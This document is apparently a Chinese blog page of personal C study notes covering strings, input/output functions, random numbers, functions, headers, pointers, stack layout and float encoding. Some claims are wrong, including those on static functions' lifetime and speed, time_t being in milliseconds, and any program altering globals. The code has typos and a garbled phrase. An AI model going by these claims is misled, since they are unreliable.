<img src="/2023/12/15/c/image-20231206203151661.png" alt="image-20231206203151661" style="zoom:50%;">

<p>字符串最后一个字符为 \0，所以有6位。</p>
<p><strong>字符串拼接</strong></p>
<img src="/2023/12/15/c/image-20231206211934907.png" alt="image-20231206211934907" style="zoom:50%;">

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>(disable:6328)</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span> ch1[] = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">	<span class="type">char</span> ch2[] = <span class="string">&quot;world&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="type">char</span> ch3[<span class="number">20</span>];</span><br><span class="line">	<span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">	<span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">while</span> (ch1[i] != <span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		ch3[i] = ch1[i];</span><br><span class="line">		i++;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">while</span> (ch2[j] != <span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		ch3[i + j] = ch2[j];</span><br><span class="line">		j++;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	ch3[i + j] = <span class="number">0</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, ch3);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h4><h5 id="字符串与字符的区别"><a href="#字符串与字符的区别" class="headerlink" title="字符串与字符的区别"></a>字符串与字符的区别</h5><p><strong>C语言中没有字符串这种数据类型，可以通过char的数组来替代：</strong><br>      	字符串一定是一个char的数组，但char的数组未必是字符串；<br>          数字0（和字符’\0’等价）结尾的char数组就是一个字符串，但如果char数组没有以数字0结尾，那么就不是一个字符串，只是普通字符数组，所以字符串是一种特殊的char的数组。</p>
<h5 id="字符串的输入与输出"><a href="#字符串的输入与输出" class="headerlink" title="字符串的输入与输出"></a>字符串的输入与输出</h5><h6 id="gets"><a href="#gets" class="headerlink" title="gets()"></a>gets()</h6><p><strong>1.功能：</strong>从标输入读入字符，并保到指定的内存间，直到出现换行符或读到文件结尾为止。</p>
<p><strong>2.gets(str)与scanf(“%s”,str)的区别：</strong><br>gets(str)允许输入的字符串含有空格<br>scanf(“%s”,str)不允许含有空格</p>
<p>但是scanf()可以通过正则表达式输入带空格的字符串：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%[^\n]&quot;</span>,  ch)</span><br></pre></td></tr></table></figure>

<p>意思是接收非回车以外的所有数值。</p>
<p><strong>注意：</strong>由于scanf()和gets()无法知道字符串s大小，必须遇到换行符或读到文件结尾为止才接收输入，因此容易导致字篮颗组画界（缓冲区溢出）的情况</p>
<h6 id="fgets"><a href="#fgets" class="headerlink" title="fgets()"></a>fgets()</h6><p><strong>1.功能：</strong>从stream指的文件内读入字符，保存轾到所指定的内存空间，直到出现换行字符、读到文件结尾或已读了size-1个字符为止，最后会自动加上字符’\0’作为序符束。</p>
<p>可以接受空格。</p>
<p><strong>2.参数：</strong></p>
<p>​		s：字符串<br>​		size：指定最大读取字符串的长度（size - 1）<br>​		stream：文件指针，如果读键盘输入的字符串，固定写为stdin</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span> ch[<span class="number">10</span>];</span><br><span class="line">	fgets(ch, <span class="keyword">sizeof</span>(ch), <span class="built_in">stdin</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, ch);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h6 id="puts"><a href="#puts" class="headerlink" title="puts()"></a>puts()</h6><p><strong>功能：</strong>标准设备输出s字符串，在输出完成后自动输出一个’\n’</p>
<h6 id="fputs"><a href="#fputs" class="headerlink" title="fputs()"></a>fputs()</h6><p><strong>1.功能：</strong>将str所指定的字符串写入到stream指定的文件中，字符串结束符’\0’ 不写入文件。</p>
<p><strong>2.参数：</strong></p>
<p>​		str：字符串<br>​		stream：文件指针，如果把字符串输出到屏幕，固定写为stdout</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span> ch[] = <span class="string">&quot;hello world&quot;</span>;</span><br><span class="line">	<span class="built_in">fputs</span>(ch, <span class="built_in">stdout</span>); <span class="comment">//等价于printf(&quot;%s&quot;, ch)</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h6 id="strlen"><a href="#strlen" class="headerlink" title="strlen()"></a>strlen()</h6><p><strong>1.功能：</strong>计算字符串长度（有效长度），计算的是第一个\0之前的长度，不包含\0</p>
<p><strong>2.返回值：</strong>返回值为unsigned int类型。</p>
<img src="/2023/12/15/c/image-20231206224553253.png" alt="image-20231206224553253" style="zoom:50%;">

<img src="/2023/12/15/c/image-20231206224718177.png" alt="image-20231206224718177" style="zoom:50%;">


<p>​																				↑↑↑↑↑↑↑		12，因为还有一个\0</p>
<p>使用strlen()函数要导入头文件 #include &lt;string.h&gt;</p>
<p>自己实现字符串长度计算</p>
<img src="/2023/12/15/c/image-20231206225332152.png" alt="image-20231206225332152" style="zoom:50%;">

<p>strlen()</p>
<img src="/2023/12/15/c/image-20231206225420024.png" alt="image-20231206225420024" style="zoom:50%;">

<h3 id="七、函数"><a href="#七、函数" class="headerlink" title="七、函数"></a>七、函数</h3><h5 id="函数调用：产生随机数"><a href="#函数调用：产生随机数" class="headerlink" title="函数调用：产生随机数"></a>函数调用：产生随机数</h5><p>当调用函数时，需要关心5要素：</p>
<p>头文件：包含指定的头文件<br>函数名字：函数名字必须和头文件声明的名字一样<br>功能：需要知道此函数能干啥后才调用。<br>参数：参数类型要匹配<br>返回值：根据需要接收返回值。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="type">time_t</span> <span class="title function_">time</span><span class="params">(<span class="type">time_t</span>*t)</span>;</span><br><span class="line"></span><br><span class="line">功能：获取当前系统时间</span><br><span class="line">参数：常设置为<span class="literal">NULL</span></span><br><span class="line">返回值：当前系统时间<span class="type">time_t</span>相当于<span class="type">long</span>类型，单位为毫秒</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">srand</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> seed)</span>;</span><br><span class="line"></span><br><span class="line">功能：用来设置rand()产生随机数时的随机种子</span><br><span class="line">参数：如果每次设置的seed相等，rand()产生随机数相等</span><br><span class="line">返回值：无</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">rand</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"></span><br><span class="line">功能：返回一个随机数值</span><br><span class="line">参数：无</span><br><span class="line">返回值：随机数</span><br></pre></td></tr></table></figure>

<p><strong>直接产生的随机数</strong></p>
<img src="/2023/12/15/c/image-20231206231811470.png" alt="image-20231206231811470" style="zoom:67%;">

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">// 添加随机数种子</span></span><br><span class="line">	srand((<span class="type">size_t</span>)time(<span class="literal">NULL</span>));</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">20</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, rand() % <span class="number">100</span>); <span class="comment">// 产生0~99之间的随机数</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>生成特定范围的随机数</p>
<img src="/2023/12/15/c/image-20231207135553294.png" alt="image-20231207135553294" style="zoom:50%;">

<img src="/2023/12/15/c/image-20231207135640611.png" alt="image-20231207135640611" style="zoom:50%;">

<p>双色球案例：注意去重</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LENGTH 6</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> arr[LENGTH] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	<span class="type">int</span> length = <span class="keyword">sizeof</span>(arr) / <span class="keyword">sizeof</span>(arr[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 添加随机数种子</span></span><br><span class="line">	srand((<span class="type">size_t</span>)time(<span class="literal">NULL</span>));</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; length; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="type">int</span> flag = <span class="number">0</span>;</span><br><span class="line">		<span class="type">int</span> value = rand() % <span class="number">32</span> + <span class="number">1</span>;</span><br><span class="line">		arr[i] = value;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; length; j++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (value == arr[j])</span><br><span class="line">			&#123;</span><br><span class="line">				flag++;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (flag != <span class="number">1</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			i--;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> blue = rand() %<span class="number">16</span> + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; length; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, arr[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;+ %d\n&quot;</span>, blue);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="1-函数的定义与使用"><a href="#1-函数的定义与使用" class="headerlink" title="1.函数的定义与使用"></a>1.函数的定义与使用</h4><h5 id="函数的定义"><a href="#函数的定义" class="headerlink" title="函数的定义"></a>函数的定义</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">返回值类型 函数名(参数列表)</span><br><span class="line">&#123;</span><br><span class="line">	代码体;</span><br><span class="line">	return 返回值;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>定义静态函数static与非静态函数，静态函数与非静态函数的<strong>区别</strong>：</p>
<ol>
<li>可见性：<strong>静态函数</strong>只能在<strong>当前文件内使用</strong>，不能被其他文件调用，而<strong>非静态函数</strong>可以被当前文件以外的其他文件调用，具有<strong>全局可见性</strong>。</li>
<li>生命周期：静态函数在程序运行期间一直存在，不会被释放，而非静态函数则是在被调用时动态地创建并在函数返回时被释放，拥有较短的生命周期。</li>
<li>内存分配：非静态函数调用时从堆栈中动态分配内存空间，函数返回时空间被释放，而静态函数分配内存空间仅一次，且在程序运行期间一直存在，调用时并不会重新分配内存空间。</li>
<li>其他：静态函数不能被其他文件调用，因此可以被认为是一种信息隐藏方法，能够有效地维护代码的安全性。同时，在一些对性能要求较高的场景，静态函数相比非静态函数性能更好，因为静态函数的调用时间更短。</li>
</ol>
<p>函数实例：判断字符串是否相等</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span> ch1[] = <span class="string">&quot;hallo&quot;</span>;</span><br><span class="line">	<span class="type">char</span> ch2[] = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">	<span class="type">int</span> value = strcompair(ch1, ch2);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (value == <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;两个字符串相同&quot;</span>);</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;两字符串不相同\t%d\n&quot;</span>, value);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">strcompair</span><span class="params">(<span class="type">char</span> ch1[], <span class="type">char</span> ch2[])</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span> (ch1[i] == ch2[i])</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">// 判断是否到了字符串结尾</span></span><br><span class="line">		<span class="keyword">if</span> (ch1[i] == <span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//没到结尾继续判断下一位</span></span><br><span class="line">		i++;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> ch1[i] &gt; ch2[i] ? <span class="number">1</span> : <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="2-函数样式"><a href="#2-函数样式" class="headerlink" title="2.函数样式"></a>2.函数样式</h4><p>1.无参函数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">function</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>2.有参函数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">function</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="3-函数的声明"><a href="#3-函数的声明" class="headerlink" title="3.函数的声明"></a>3.函数的声明</h4><p>如果函数定义在主函数之后，则函数需要在主函数之前声明。</p>
<h4 id="4-main函数和exit函数"><a href="#4-main函数和exit函数" class="headerlink" title="4.main函数和exit函数"></a>4.main函数和exit函数</h4><p>exit()函数：结束程序运行</p>
<p>在主函数中，main()，使用return和exit基本没有区别，都会结束程序运行</p>
<p>在函数中，使用return会返回返回值，使用exit()也会停止整个程序</p>
<p>例如：一个程序中有一个加载图片的函数，图片加载不了程序不能正常运行，则此时使用exit()函数使程序终止。</p>
<h3 id="八、多文件编程"><a href="#八、多文件编程" class="headerlink" title="八、多文件编程"></a>八、多文件编程</h3><p><strong>·</strong>可以再头文件中声明函数，在主函数中只导入头文件即可，不用一直声明函数。</p>
<img src="/2023/12/15/c/image-20231207213854267.png" alt="image-20231207213854267" style="zoom:150%;">

<p>自定义函数文件和自定义头文件可以文件名相同，可以方便捋顺程序</p>
<p>自定义的头文件中要写，防止main函数 头文件包含</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br></pre></td></tr></table></figure>

<p>如果头文件包含则会报错：</p>
<img src="/2023/12/15/c/image-20231207215038085.png" alt="image-20231207215038085" style="zoom:67%;">

<p>为了避免同一个文件被include多次，C&#x2F;C++中有两种方式，一种是#ifndef方式，一种是pragma once方式</p>
<p>#pragma once：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="comment">//声明语句</span></span><br></pre></td></tr></table></figure>

<p>#ifndef</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#indef __SOMEFILE_H__</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __SOMEFILE_H__</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 声明语句</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<h3 id="九、指针"><a href="#九、指针" class="headerlink" title="九、指针"></a>九、指针</h3><h4 id="1-定义指针"><a href="#1-定义指针" class="headerlink" title="1.定义指针"></a>1.定义指针</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> a = <span class="number">10</span>;</span><br><span class="line"><span class="type">int</span>* p;</span><br></pre></td></tr></table></figure>

<p>定义指针时，想存储什么类型的数据就要定义什么类型的指针。</p>
<p><strong>通过指针赋值：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> a = <span class="number">0</span>;</span><br><span class="line">	<span class="type">int</span>* p = &amp;a;</span><br><span class="line">	*p = <span class="number">100</span>; </span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, a);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>运算符</th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>*</td>
<td>取值运算符</td>
</tr>
<tr>
<td>&amp;</td>
<td>取地址运算符</td>
</tr>
</tbody></table>
<p>可以通过 &amp;a 取出 a 的地址赋值给指针p，也可以通过 * p 取出指针p所指向的变量存储的值 </p>
<p>指针所占内存大小：</p>
<img src="/2023/12/15/c/image-20231207224226442.png" alt="image-20231207224226442" style="zoom: 67%;">

<img src="/2023/12/15/c/image-20231207224336967.png" alt="image-20231207224336967" style="zoom:67%;">

<p>​                                    <strong>在32位操作系统中，指针大小为4字节</strong>                                          <strong>在64位操作系统中，指针大小为8字节</strong></p>
<h4 id="2-野指针和空指针"><a href="#2-野指针和空指针" class="headerlink" title="2.野指针和空指针"></a>2.野指针和空指针</h4><h5 id="野指针"><a href="#野指针" class="headerlink" title="野指针"></a>野指针</h5><img src="/2023/12/15/c/image-20231207230337071.png" alt="image-20231207230337071" style="zoom:67%;">

<p>所以，存在野指针不会出现错误，但是操作或访问野指针时可能会出错。</p>
<p>不建议把一个变量的值直接赋值给指针。</p>
<h5 id="空指针"><a href="#空指针" class="headerlink" title="空指针"></a>空指针</h5><p> 空指针是指内存地址编号为0的空间</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span>* p = <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure>

<p>空指针也不能访问或操作</p>
<p><strong>应用：</strong>空指针可以用作条件判断</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (p==<span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="万能指针-void"><a href="#万能指针-void" class="headerlink" title="万能指针 void*"></a>万能指针 void*</h5><p><strong>所占字节大小</strong></p>
<p>在32为操作系统下占4个字节，在64为操作系统下占8个字节</p>
<p>万能指针可以接受任意类型变量的内存地址</p>
<p>但是通过万能指针操作（访问、修改）所指变量时，必须找到变量对应的指针类型，如：</p>
<img src="/2023/12/15/c/image-20231207232205725.png" alt="image-20231207232205725" style="zoom:67%;">

<p>必须将指针p强制转换为int类型指针：</p>
<img src="/2023/12/15/c/image-20231207232316993.png" alt="image-20231207232316993" style="zoom:67%;">

<h5 id="const修饰的指针类型"><a href="#const修饰的指针类型" class="headerlink" title="const修饰的指针类型"></a>const修饰的指针类型</h5><img src="/2023/12/15/c/image-20231207233230201.png" alt="image-20231207233230201" style="zoom:67%;">
通过指针修改了const修饰的常量



<h6 id="1-const修饰指针类型"><a href="#1-const修饰指针类型" class="headerlink" title="1.const修饰指针类型"></a>1.const修饰指针类型</h6><p>可以修改指针变量的值，不可以修改指针指向内存空进的值。（const离谁近就不能改谁</p>
<h6 id="2-const修饰指针变量"><a href="#2-const修饰指针变量" class="headerlink" title="2.const修饰指针变量"></a>2.const修饰指针变量</h6><p>可以修改指针指向内存空间的值</p>
<h6 id="3-const同时修饰指针类型和指针变量（只读指针）"><a href="#3-const同时修饰指针类型和指针变量（只读指针）" class="headerlink" title="3.const同时修饰指针类型和指针变量（只读指针）"></a>3.const同时修饰指针类型和指针变量（只读指针）</h6><p>当const同时修饰指针类型和指针变量时，可以使用二级指针对一级指针所指的变量进行修改。</p>
<img src="/2023/12/15/c/image-20231207235602859.png" alt="image-20231207235602859" style="zoom:67%;">

<h4 id="3-指针与数组"><a href="#3-指针与数组" class="headerlink" title="3.指针与数组"></a>3.指针与数组</h4><p>指针与数组（p与arr）的区别：</p>
<img src="/2023/12/15/c/image-20231208091528010.png" alt="image-20231208091528010" style="zoom:67%;">

<p>数组arr所指的地址不仅有地址，还包含数组的长度，使用指针p接收arr的地址，p只是一个指针变量，不具有整个数组的长度。</p>
<p><strong>当数组作为函数参数会退化为指针。</strong>变成指针后，一个指针变量的大小为4字节(32位)，丢失了数组的元素个数</p>
<img src="/2023/12/15/c/image-20231208092320722.png" alt="image-20231208092320722" style="zoom: 67%;">

<h4 id="4-指针的加减运算"><a href="#4-指针的加减运算" class="headerlink" title="4.指针的加减运算"></a>4.指针的加减运算</h4><h5 id="1-加法运算"><a href="#1-加法运算" class="headerlink" title="1.加法运算"></a>1.加法运算</h5><p>指针计算不是简单得整数相加，</p>
<p>如果是一个int *，+1的结果是增加一个int的大小；</p>
<p>如果是一个char*，+1的结果是增加一个char大小。</p>
<p><strong>通过指针运算，计算字符串长度。</strong></p>
<img src="/2023/12/15/c/image-20231208094010583.png" alt="image-20231208094010583" style="zoom:67%;">

<p><strong>复制字符串</strong></p>
<img src="/2023/12/15/c/image-20231208095300785.png" alt="image-20231208095300785" style="zoom:67%;">

<h5 id="2-减法运算"><a href="#2-减法运算" class="headerlink" title="2.减法运算"></a>2.减法运算</h5><h2 id="C-汇编"><a href="#C-汇编" class="headerlink" title="C 汇编"></a>C 汇编</h2><h3 id="1-参数与返回值"><a href="#1-参数与返回值" class="headerlink" title="1.参数与返回值"></a>1.参数与返回值</h3><h4 id="函数定义"><a href="#函数定义" class="headerlink" title="函数定义"></a>函数定义</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">返回类型 函数名（参数列表）</span><br><span class="line">&#123;</span><br><span class="line">	return；</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>返回类型和参数列表的参数类型，如int(4byte), short(2byte),char(1byte)等用来说明数据宽度是多大</p>
<h4 id="函数返回值"><a href="#函数返回值" class="headerlink" title="函数返回值"></a>函数返回值</h4><img src="/2023/12/15/c/image-20231228141753125.png" alt="image-20231228141753125" style="zoom:67%;">

<img src="/2023/12/15/c/image-20231228141919911.png" alt="image-20231228141919911" style="zoom:67%;">

<p>函数返回后使用eax存储，函数ret后，eax存储的返回值被压到堆栈中。</p>
<h3 id="2-变量"><a href="#2-变量" class="headerlink" title="2.变量"></a>2.变量</h3><h4 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a>全局变量</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> x;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	x = <span class="number">123456</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>1)编译的时候就已经确定了内存地址和宽度，变量名就是内存地址的别名。</p>
<p>2)如果不重写编译，全局变量的内存地址不变。游戏外挂中的找“基址”，其实就是找全局变量。</p>
<p>3)全局变量中的值任何程序都可以改，是公用的。</p>
<h4 id="局部变量"><a href="#局部变量" class="headerlink" title="局部变量"></a>局部变量</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">function</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> x = <span class="number">123456</span>;</span><br><span class="line">	<span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	funtion();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>1)局部变量是函数内部申请的，如果函数没有执行，那么局部变量没有内存空间。</p>
<p>2)局部变量的内存是在堆栈中分配的，程序执行时才分配。我们无法预知程序何时执行，这也就意味着，我们无法确定局部变量的内存地址。</p>
<p>3)因为局部变量地址内存是不确定的，所以，局部变量只能在函数内部使用，其他函数不能使用。</p>
<h4 id="函数调用的内存布局"><a href="#函数调用的内存布局" class="headerlink" title="函数调用的内存布局"></a>函数调用的内存布局</h4><img src="/2023/12/15/c/image-20231228202155115.png" alt="image-20231228202155115" style="zoom: 50%;">

<h4 id="函数嵌套调用的内存布局"><a href="#函数嵌套调用的内存布局" class="headerlink" title="函数嵌套调用的内存布局"></a>函数嵌套调用的内存布局</h4><h3 id="变量类型"><a href="#变量类型" class="headerlink" title="变量类型"></a>变量类型</h3><h4 id="基本类型"><a href="#基本类型" class="headerlink" title="基本类型"></a>基本类型</h4><h5 id="整数类型"><a href="#整数类型" class="headerlink" title="整数类型"></a>整数类型</h5><p>整数类型的宽度：char short int long</p>
<p>char	8BIT	1字节<br>short	16BIT	2字节<br>int		32BIT	4字节<br>long	32BIT	4字节</p>
<h5 id="浮点类型"><a href="#浮点类型" class="headerlink" title="浮点类型"></a>浮点类型</h5><p>浮点类型的存储格式：float和double在存储方式上都是遵从IEEE编码规范的</p>
<p><img src="/2023/12/15/c/image-20240102144902818.png" alt="image-20240102144902818"></p>
<p><strong>8.25转成浮点存储：整数部分</strong></p>
<p>整数部分8转成2进制<br>8&#x2F;2 &#x3D; 4			0<br>4&#x2F;2 &#x3D; 2			0<br>2&#x2F;2 &#x3D; 1			0<br>1&#x2F;2 &#x3D; 0			1<br>从下往上读，所以8转成2进制是1000</p>
<p><strong>9转2进制：</strong><br>9&#x2F;2 &#x3D; 4			1<br>4&#x2F;2 &#x3D; 2			0<br>2&#x2F;2 &#x3D; 1			0<br>1&#x2F;2 &#x3D; 0			1<br>所以9转2进制是1001</p>
<p>所以，所有的整数部分一定能转成2进制</p>
<p><strong>8.25转2进制：小数部分</strong></p>
<p>小数部分转2进制用乘法</p>
<p>0.25转2进制：<br>0.25 * 2 &#x3D; 0.5		0<br>0.5 * 2 &#x3D; 1.0		1</p>
<p>当小数部分乘出0时停止<br>从上往下读：0.25转成2进制是01</p>
<p><strong>如小数部分0.4转成2进制：</strong><br>0.4 * 2 &#x3D; 0.8		0<br>0.8 * 2 &#x3D; 1.6		1<br>0.6 * 2 &#x3D; 1.2		1<br>0.2 * 2 &#x3D; 0.4		0<br>……</p>
<p>会发现当0.4转成2进制的时候，小数部分永远得不到0，所以用二进制描述小数，不可能做到完全精确</p>
<p><strong>使用IEEE规则存储小数8.25 -&gt; 1000.01 -&gt; 1.00001 * 2(10)^3</strong></p>
